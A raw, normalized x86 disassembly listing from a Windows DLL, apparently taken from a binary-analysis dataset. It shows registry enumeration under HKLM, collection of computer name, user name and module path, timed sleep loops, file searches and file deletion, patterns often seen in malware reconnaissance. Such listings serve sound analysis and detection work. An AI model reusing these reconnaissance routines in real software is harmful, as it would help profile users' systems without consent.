je r-xdata
mov eax [ ebp - 0xb38 ]
push eax
call [ RegCloseKey@IAT ]
pop esi
pop ebx
xor eax eax
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0xb38 ]
push 0x0
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0xb58 ]
push edx
lea eax [ ebp - 0xb34 ]
push eax
push esi
push ecx
mov [ ebp - 0xb58 ] 0xff
call [ RegEnumKeyExW@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0xb38 ]
push ecx
call [ RegCloseKey@IAT ]
pop esi
pop ebx
mov eax 0x3
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x1c ]
mov eax 0x1d
call sub_10015360
lea edx [ ebp - 0x124 ]
mov eax 0xc
call sub_10015360
lea edx [ ebp - 0xb34 ]
push edx
lea eax [ ebp - 0x124 ]
push eax
lea ecx [ ebp - 0x1c ]
push ecx
mov ecx 0x104
lea ebx [ ebp - 0x52c ]
call sub_10041b00
add esp 0xc
lea edx [ ebp - 0x34 ]
mov eax 0x2
call sub_10015360
lea edx [ ebp - 0xb40 ]
push edx
push 0x20119
push 0x0
mov eax ebx
push eax
push 0x80000002
call edi
test eax eax
jne r-xdata
inc esi
mov [ ebp - 0xb3c ] esi
cmp esi [ ebp - 0xb48 ]
jb r-xdata
mov ebx [ RegQueryValueExW@IAT ]
lea ecx [ ebp - 0xb60 ]
push ecx
mov ecx [ ebp - 0xb40 ]
lea edx [ ebp - 0x324 ]
push edx
push eax
push eax
lea eax [ ebp - 0x34 ]
push eax
push ecx
mov [ ebp - 0xb60 ] 0x1fe
call ebx
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0xb38 ]
push eax
call [ RegCloseKey@IAT ]
pop esi
pop ebx
xor eax eax
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0xb40 ]
push edx
call [ RegCloseKey@IAT ]
test esi esi
jne r-xdata
mov esi 0x2
mov esi [ ebp - 0xb3c ]
lea edx [ ebp - 0x54 ]
lea eax [ esi + 0xa ]
call sub_10015360
lea eax [ ebp - 0xb44 ]
push eax
push 0x20119
push esi
lea ecx [ ebp - 0x52c ]
push ecx
push 0x80000002
call edi
test eax eax
jne r-xdata
lea edx [ ebp - 0xb54 ]
push edx
mov edx [ ebp - 0xb44 ]
lea eax [ ebp - 0x934 ]
push eax
push esi
push esi
lea ecx [ ebp - 0x54 ]
push ecx
push edx
mov [ ebp - 0xb54 ] 0x1fe
call ebx
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0xb44 ]
push eax
call [ RegCloseKey@IAT ]
test esi esi
jne r-xdata
mov esi 0x2
mov ecx [ ebp - 0xb5c ]
mov esi [ StrStrIW@IAT ]
push ecx
lea edx [ ebp - 0x324 ]
push edx
call esi
test eax eax
je r-xdata
mov eax [ ebp - 0xb50 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax 0x1b
call sub_10015360
lea edx [ ebp - 0x934 ]
push edx
lea eax [ ebp - 0x324 ]
push eax
lea ecx [ ebp - 0x10 ]
push ecx
mov ecx 0x104
lea ebx [ ebp - 0x734 ]
call sub_10041b00
mov edx [ ebp - 0xb4c ]
add esp 0xc
push edx
mov edx ebx
call sub_1005eea0
push eax
lea eax [ ebp - 0x324 ]
push eax
call esi
test eax eax
je r-xdata
sub_10050300
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
mov ecx [ rw-data ]
fld [ r--data ]
fsubr st1
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fabs
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fld [ r--data ]
fcom st1
fnstsw ax
fstp st1
test ah 0x41
jne r-xdata
fld st1
fsub [ r--data ]
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fabs
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fstp st1
fstp st0
fldz
fstp [ ecx + 0x114 ]
pop ebp
retn 0x4
fld st1
fsub [ r--data ]
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fabs
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fstp st1
fstp st0
fld [ r--data ]
fstp [ ecx + 0x114 ]
pop ebp
retn 0x4
fxch st1
fsub [ r--data ]
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fabs
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fcompp
fnstsw ax
test ah 0x5
jpe r-xdata
fstp st1
fstp st0
fld1
fstp [ ecx + 0x114 ]
pop ebp
retn 0x4
pop ebp
retn 0x4
fld [ r--data ]
fstp [ ecx + 0x114 ]
sub_100503e0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
push esi
mov esi [ eax + 0x8 ]
mov [ edx ] esi
mov esi [ eax + 0x8 ]
cmp [ esi + 0x15 ] 0x0
jne r-xdata
mov esi [ edx + 0x4 ]
mov [ eax + 0x4 ] esi
mov ecx [ ecx + 0x4 ]
pop esi
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov ecx [ edx + 0x4 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebp
retn 0x4
mov [ ecx ] eax
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebp
retn 0x4
mov [ ecx + 0x8 ] eax
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebp
retn 0x4
sub_10050437
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_10008757
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_1000bd19
int3
sub_10050467
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1006a508
push [ ebp + 0x24 ]
mov edx [ ebp + 0x1c ]
push [ ebp + 0x20 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_1007e778
add esp 0x18
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_100504b0
push ebp
mov ebp esp
push 0xffffffff
push sub_10083a03
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2dc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi edi
xor edi edi
lea ebx [ ebx ]
call sub_10022260
cmp eax edi
je r-xdata
call sub_100576f0
cmp eax edi
je r-xdata
mov eax [ esi ]
push eax
call [ SetEvent@IAT ]
mov eax [ rw-data ]
add esi 0x4
cmp esi eax
jne r-xdata
mov esi [ rw-data ]
cmp esi eax
je r-xdata
test [ rw-data ] 0x1
jne r-xdata
mov ecx eax
call sub_1003ace0
test eax eax
jne r-xdata
xor edi edi
push edi
push eax
push esi
call sub_10078db0
add esp 0xc
mov [ rw-data ] esi
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
or [ rw-data ] esi
mov [ ebp - 0x4 ] edi
xor ecx ecx
mov [ rw-data ] 0x7
mov [ rw-data ] edi
mov [ rw-data ] cx
mov esi rw-data
mov [ ebp - 0x4 ] 0x1
call sub_100513e0
push j_sub_10048db0
call sub_100662c2
add esp 0x4
mov [ ebp - 0x4 ] 0xffffffff
mov esi 0x1
mov [ rw-data ] esi
push rw-data
call [ LeaveCriticalSection@IAT ]
mov ebx [ GetTickCount@IAT ]
call ebx
mov esi 0x1
mov [ ebp - 0x2e8 ] eax
mov [ ebp - 0x2dc ] edi
mov [ ebp - 0x2e0 ] edi
cmp [ rw-data ] esi
jne r-xdata
call sub_1006a590
cmp eax edi
je r-xdata
call sub_10037f80
cmp eax edi
je r-xdata
lea edx [ ebp - 0x2dc ]
push edx
lea ecx [ ebp - 0x2e0 ]
call sub_1005d5e0
test eax eax
je r-xdata
mov ecx eax
call sub_1000a6d0
test eax eax
jne r-xdata
cmp [ rw-data ] di
je r-xdata
mov ebx esi
mov [ rw-data ] esi
mov esi rw-data
call sub_10054730
cmp [ rw-data ] edi
je r-xdata
lea eax [ ebp - 0x2d8 ]
push eax
push rw-data
call [ FindFirstFileW@IAT ]
cmp eax 0xffffffff
je r-xdata
push rw-data
call sub_100443a0
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
lea edx [ ebp - 0x2dc ]
push edx
mov [ ebp - 0x2dc ] edi
call sub_1003b1ca
mov eax [ ebp - 0x2dc ]
call ebx
mov ecx eax
sub ecx [ ebp - 0x2e8 ]
mov eax [ rw-data ]
add eax ecx
mov [ rw-data ] eax
cmp eax 0x927c0
jb r-xdata
push eax
call [ FindClose@IAT ]
lea eax [ ebp - 0x2ac ]
lea edx [ eax + 0x2 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
test edi edi
je r-xdata
xor eax eax
mov edi edi
push rw-data
call [ EnterCriticalSection@IAT ]
mov esi [ rw-data ]
mov eax [ rw-data ]
cmp esi eax
je r-xdata
cmp [ rw-data ] edi
je r-xdata
push 0x1
mov [ rw-data ] edi
mov [ rw-data ] edi
call sub_10008ba0
add esp 0x4
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
mov esi [ rw-data ]
mov [ rw-data ] 0x0
test esi esi
je r-xdata
cmp ebx 0x1
jne r-xdata
inc eax
cmp eax 0x29
jb r-xdata
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x2710
call [ Sleep@IAT ]
jmp r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0x2ac ]
push ecx
mov ecx rw-data
call sub_100531b0
lea edx [ ebp - 0x2e0 ]
push edx
lea eax [ ebp - 0x2dc ]
push eax
lea eax [ ebp - 0x2ac ]
call sub_10015a50
add esp 0x8
neg eax
sbb eax eax
inc eax
cmp eax edi
je r-xdata
mov esi rw-data
call sub_10054730
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ ecx ]
cmp ebx 0x2
jne r-xdata
lea eax [ ebp - 0x2dc ]
call sub_10017490
jmp r-xdata
mov ebx 0x2
jmp r-xdata
lea eax [ ebp - 0x2e4 ]
push eax
mov [ ebp - 0x2e4 ] 0x0
call sub_1003b1ca
mov eax [ ebp - 0x2e4 ]
jmp r-xdata
push 0x2710
call [ Sleep@IAT ]
jmp r-xdata
mov ecx esi
call sub_10028af0
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
push edi
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ rw-data ]
push r--data
xor edi edi
mov ecx rw-data
call sub_10039b60
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x70 ] 0x7
mov [ ebp - 0x74 ] edi
mov [ ebp - 0x84 ] ax
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x2e0 ]
mov edi [ ebp - 0x2dc ]
push ecx
push edi
mov ecx rw-data
mov esi rw-data
call sub_10013880
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov esi [ rw-data ]
xor edx edx
sub esi ecx
div esi
add esp 0x4
add edx ecx
imul edx edx 0x3e8
push edx
call [ Sleep@IAT ]
jmp r-xdata
cmp [ rw-data ] 0x8
mov eax [ rw-data ]
jae r-xdata
push eax
call [ DeleteFileW@IAT ]
push 0x0
push r--data
mov ecx rw-data
call sub_100531b0
mov eax rw-data
sub_100508a0
push 0xffffffff
push 0x0
push edi
mov ecx esi
call sub_10019180
push 0xffffffff
push 0x0
lea eax [ edi + 0x1c ]
push eax
lea ecx [ esi + 0x1c ]
call sub_10019180
mov cx [ edi + 0x38 ]
push 0xffffffff
push 0x0
lea edx [ edi + 0x3c ]
mov [ esi + 0x38 ] cx
push edx
lea ecx [ esi + 0x3c ]
call sub_10019180
push 0xffffffff
push 0x0
lea eax [ edi + 0x58 ]
push eax
lea ecx [ esi + 0x58 ]
call sub_10019180
mov cl [ edi + 0x74 ]
mov [ esi + 0x74 ] cl
mov edx [ edi + 0x78 ]
mov [ esi + 0x78 ] edx
mov eax [ edi + 0x7c ]
mov [ esi + 0x7c ] eax
mov eax esi
retn
sub_10050a20
push ebp
mov ebp esp
sub esp 0x8
mov edx [ rw-data ]
mov eax [ edx + 0x10 ]
push ebx
push esi
lea esi [ edx + 0xc ]
push edi
mov edi [ edx + 0x8 ]
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] 0x0
cmp ecx eax
jae r-xdata
cmp eax [ esi + 0x8 ]
jne r-xdata
mov ecx [ esi ]
lea ebx [ ebp - 0x8 ]
cmp ecx ebx
ja r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx esi
call sub_1005d500
mov edx [ rw-data ]
mov edi ebx
sub edi ecx
sar edi 0x3
cmp eax [ esi + 0x8 ]
jne r-xdata
add [ esi + 0x4 ] 0x8
mov eax [ edx + 0x8 ]
pop edi
lea ecx [ eax + 0x1 ]
pop esi
mov [ edx + 0x8 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov [ eax ] edi
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx esi
call sub_1005d500
mov edx [ rw-data ]
mov ecx [ esi ]
mov ebx [ ecx + edi * 8 ]
mov [ eax ] ebx
mov ecx [ ecx + edi * 8 + 0x4 ]
jmp r-xdata
mov [ eax + 0x4 ] ecx
sub_10050ac0
push ebp
mov ebp esp
push 0xffffffff
push sub_10082a78
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x30 ] ebx
cmp [ eax + 0x1c ] ebx
jne r-xdata
push r--data
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_1002cd10
add esp 0xc
mov [ ebp - 0x4 ] ebx
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x2c ]
mov eax edx
cmp ecx 0x8
jae r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ esi ] bl
jmp r-xdata
mov edi [ ebp - 0x1c ]
cmp ecx 0x8
lea eax [ eax + edi * 2 ]
mov ecx edx
jae r-xdata
lea eax [ ebp - 0x2c ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x30 ]
push edx
push eax
push ecx
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push esi
mov [ esi ] bl
call sub_1003f620
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
lea ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x2c ]
push eax
call sub_1006591f
add esp 0x4
sub_10050b90
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x10 ]
push edi
cmp esi 0x4
jb r-xdata
test esi esi
je r-xdata
mov eax [ edx ]
cmp eax [ ecx ]
jne r-xdata
pop edi
xor eax eax
pop esi
pop ebp
retn
movzx eax [ edx ]
movzx edi [ ecx ]
sub eax edi
jne r-xdata
sub esi 0x4
add ecx 0x4
add edx 0x4
cmp esi 0x4
jae r-xdata
sar eax 0x1f
pop edi
or eax 0x1
pop esi
pop ebp
retn
cmp esi 0x1
jbe r-xdata
movzx eax [ edx + 0x1 ]
movzx edi [ ecx + 0x1 ]
sub eax edi
jne r-xdata
cmp esi 0x2
jbe r-xdata
movzx eax [ edx + 0x2 ]
movzx edi [ ecx + 0x2 ]
sub eax edi
jne r-xdata
cmp esi 0x3
jbe r-xdata
movzx eax [ edx + 0x3 ]
movzx ecx [ ecx + 0x3 ]
sub eax ecx
sub_10050c06
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003233d
add esp 0x18
pop ebp
retn
sub_10050c26
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
jbe r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x14 ]
lea ecx [ ebp + 0xc ]
call sub_10044159
dec [ ebp + 0x18 ]
jne r-xdata
sub_10050c51
push 0xc
mov eax sub_1007f609
call sub_1002152b
mov esi ecx
mov [ ebp - 0x18 ] esi
mov edi [ ebp + 0x8 ]
or edi 0x7
cmp edi 0x7ffffffe
jbe r-xdata
xor edx edx
push 0x3
mov eax edi
pop ebx
div ebx
mov ecx [ esi + 0x14 ]
mov [ ebp - 0x14 ] ecx
shr [ ebp - 0x14 ] 0x1
mov edx [ ebp - 0x14 ]
cmp edx eax
jbe r-xdata
mov edi [ ebp + 0x8 ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ edi + 0x1 ]
push 0x0
push eax
call sub_10019a8f
pop ecx
pop ecx
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov edi 0x7ffffffe
mov eax edi
sub eax edx
cmp ecx eax
ja r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
lea edi [ edx + ecx ]
push 0x0
push 0x1
mov ecx esi
call sub_1000aecf
mov eax [ ebp + 0x8 ]
mov [ esi ] eax
mov [ esi + 0x14 ] edi
mov [ esi + 0x10 ] ebx
cmp edi 0x8
jae r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ eax + ebx * 2 ] cx
call sub_1004db01
retn 0x8
mov eax esi
mov eax esi
mov eax [ esi ]
jmp r-xdata
lea ecx [ ebx + ebx ]
push ecx
push eax
push [ ebp + 0x8 ]
call sub_100796a0
add esp 0xc
sub_10050cb4
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] eax
inc eax
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10019a8f
pop ecx
mov [ ebp + 0x8 ] eax
pop ecx
mov eax r-xdata
retn
sub_10050d3e
push 0x28
mov eax sub_1007f6b0
call sub_100097c8
and [ ebp - 0x10 ] 0x0
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_1004db01
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x34
call sub_10055606
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_1004d460
and [ esi + 0x4 ] 0x0
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
push ecx
mov [ esi + 0x28 ] cl
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
call sub_1004de1d
mov [ esi ] r--data
jmp r-xdata
sub_10050de0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
jmp edx
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov eax edx
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x1 ]
mov [ ecx ] edx
movzx eax [ eax ]
retn
sub_10050e10
push ebp
mov ebp esp
push 0xffffffff
push sub_10082570
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi [ ebp + 0x8 ]
xor esi esi
mov [ edi + 0x8 ] esi
mov [ edi + 0xc ] esi
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + edi + 0x38 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x1c ] edi
cmp ecx esi
je r-xdata
mov [ ebp - 0x4 ] esi
call sub_1002fe00
mov [ ebp - 0x18 ] al
mov [ ebp - 0x4 ] 0x1
test al al
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov edx [ edi ]
mov ecx [ edx + 0x4 ]
mov edx [ ebp - 0x14 ]
add ecx edi
cmp edx esi
je r-xdata
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x2
mov ecx [ edi ]
mov edx [ ecx + 0x4 ]
mov ecx [ edx + edi + 0x38 ]
mov eax [ ecx ]
mov edx [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
push ebx
push esi
push edx
call eax
add [ edi + 0x8 ] eax
mov ecx edx
adc [ edi + 0xc ] ecx
cmp eax esi
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + edi + 0x38 ]
cmp ecx esi
je r-xdata
mov eax [ ecx + 0xc ]
or eax edx
cmp [ ecx + 0x38 ] esi
jne r-xdata
mov [ ebp - 0x14 ] 0x3
cmp ecx ebx
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
and eax 0x17
mov [ ecx + 0xc ] eax
test [ ecx + 0x10 ] eax
je r-xdata
or eax 0x4
xor esi esi
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
push esi
call sub_1003c700
sub_10050eb6
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
and eax 0x17
mov [ ecx + 0xc ] eax
test [ ecx + 0x10 ] eax
je r-xdata
or eax 0x4
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
push 0x1
call sub_1003c700
sub_10050f70
push ebp
mov ebp esp
sub esp 0x128
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
test esi esi
jne r-xdata
lea edx [ ebp - 0x98 ]
mov eax 0x11a
call sub_10013830
push rw-data
push esi
mov ecx edx
call sub_10057d90
add esp 0x8
test eax eax
je r-xdata
lea eax [ esi + 0x1 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0xe0 ]
mov eax 0x137
call sub_10013830
push rw-data
push esi
mov ecx edx
call sub_10057d90
add esp 0x8
test eax eax
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x128 ]
mov eax 0xdc
call sub_10013830
push rw-data
push esi
mov ecx edx
call sub_10057d90
add esp 0x8
test eax eax
je r-xdata
mov eax 0x3
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x50 ]
mov eax 0x157
call sub_10013830
push rw-data
push esi
mov ecx edx
call sub_10057d90
mov ecx [ ebp - 0x4 ]
add esp 0x8
neg eax
sbb eax eax
xor ecx ebp
and eax 0x5
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax 0x4
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10051070
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_10042f30
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov edi [ rw-data ]
mov [ ebp - 0x24 ] edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov esi 0x104
push esi
lea eax [ edi + 0x124 ]
push eax
push ebx
call [ GetModuleFileNameW@IAT ]
mov [ ebp - 0x1c ] esi
lea ecx [ ebp - 0x1c ]
push ecx
lea edx [ edi + 0x73c ]
push edx
call [ GetComputerNameW@IAT ]
mov [ ebp - 0x20 ] ebx
mov eax [ edi + 0x8 ]
cmp eax 0x6
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
call [ GetCurrentProcess@IAT ]
push eax
call [ IsWow64Process@IAT ]
cmp eax 0x5
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x20 ]
mov [ edi + 0xd54 ] ecx
mov [ ebp - 0x1c ] esi
lea edx [ ebp - 0x1c ]
push edx
lea eax [ edi + 0x944 ]
push eax
call [ GetUserNameW@IAT ]
call sub_1002ca50
mov [ edi + 0xd58 ] eax
lea ecx [ edi + 0xb4c ]
call sub_10010020
lea ecx [ edi + 0xd7c ]
push ecx
mov ecx edi
call sub_100211b0
lea ecx [ edi + 0xd5c ]
call sub_10022fe0
mov [ edi + 0xdc4 ] 0x1
jmp r-xdata
cmp [ edi + 0xc ] 0x1
jbe r-xdata
sub_10051187
mov edi edi
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
fldz
fld st0
fucomp st2
fnstsw ax
fstp st1
test ah 0x44
jpe r-xdata
movzx eax [ ebp + 0xe ]
xor ecx ecx
test eax 0x7ff0
jne r-xdata
xor edx edx
jmp r-xdata
push ecx
fstp st0
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_1001c0c1
movzx edx [ ebp + 0xe ]
shr edx 0x4
and edx 0x7ff
add esp 0xc
sub edx 0x3fe
test [ ebp + 0xc ] 0xfffff
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] edx
pop ebp
retn
fcomp [ ebp + 0x8 ]
mov edx 0xfffffc03
fnstsw ax
test ah 0x41
jne r-xdata
cmp [ ebp + 0x8 ] ecx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
jmp r-xdata
test [ ebp + 0xe ] 0x10
je r-xdata
shl [ ebp + 0xc ] 0x1
test [ ebp + 0x8 ] 0x80000000
je r-xdata
push esi
mov esi 0xffef
and [ ebp + 0xe ] si
pop esi
cmp eax ecx
je r-xdata
shl [ ebp + 0x8 ] 0x1
dec edx
or [ ebp + 0xc ] 0x1
fld [ ebp + 0x8 ]
push ecx
push ecx
push ecx
fstp [ esp ]
call sub_1001c0c1
add esp 0xc
jmp r-xdata
mov eax 0x8000
or [ ebp + 0xe ] ax
sub_10051266
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1c ] eax
call sub_10029ea7
and [ ebp - 0x14 ] 0x0
cmp [ rw-data ] 0x0
mov [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x18 ]
mov esi [ DecodePointer@IAT ]
cmp eax ecx
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
cmp [ rw-data ] ecx
je r-xdata
xor eax eax
mov edi [ GetProcAddress@IAT ]
push r--data
push ebx
call edi
test eax eax
je r-xdata
push [ rw-data ]
call esi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
push eax
call esi
push [ rw-data ]
mov edi eax
call esi
mov ebx eax
test edi edi
je r-xdata
mov esi [ EncodePointer@IAT ]
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x14 ]
call eax
jmp r-xdata
call eax
